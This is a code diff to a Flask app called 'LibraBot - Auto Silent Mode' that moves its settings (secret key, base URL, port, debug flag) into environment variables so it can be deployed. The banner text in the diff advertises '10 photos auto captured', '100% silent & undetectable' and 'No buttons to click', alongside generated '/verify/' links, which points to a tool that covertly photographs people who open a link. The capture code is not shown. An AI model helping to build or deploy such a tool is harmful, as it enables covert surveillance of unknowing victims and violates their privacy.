@@ -4,7 +4,7 @@ from datetime import datetime
 from PIL import Image
 
 app = Flask(__name__)
-app.secret_key = 'librabot_secret_key'
+app.secret_key = os.environ.get('SECRET_KEY', 'librabot_secret_key')
 
 # Files
 USERS_FILE = 'users.json'
@@ -237,7 +237,9 @@ def setup():
     }
     save_data(LINKS_FILE, links)
     
-    link_url = f"{request.host_url}verify/{link_code}"
+    # Use environment variable for base URL if available
+    base_url = os.environ.get('BASE_URL', request.host_url.rstrip('/'))
+    link_url = f"{base_url}/verify/{link_code}"
     
     return jsonify({
         'success': True,
@@ -736,6 +738,9 @@ def stats():
     return html
 
 if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    debug = os.environ.get('DEBUG', 'False').lower() == 'true'
+    
     print(f"""
 ╔══════════════════════════════════════════════╗
 ║         LibraBot - Auto Silent Mode         ║
@@ -745,8 +750,8 @@ if __name__ == '__main__':
 ║ ✅ 10 photos auto captured                  ║
 ║ ✅ 100% silent & undetectable               ║
 ╠══════════════════════════════════════════════╣
-║ 🌐 Home: http://localhost:5000/              ║
-║ 📊 Stats: http://localhost:5000/stats        ║
+║ 🌐 Server running on port {port:<15}        ║
+║ 📊 Stats: /stats                            ║
 ╠══════════════════════════════════════════════╣
 ║ 📝 Features:                                 ║
 ║ • No buttons to click                        ║
@@ -756,4 +761,4 @@ if __name__ == '__main__':
 ║ • Works even without camera                  ║
 ╚══════════════════════════════════════════════╝
 """)
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    app.run(host='0.0.0.0', port=port, debug=debug)
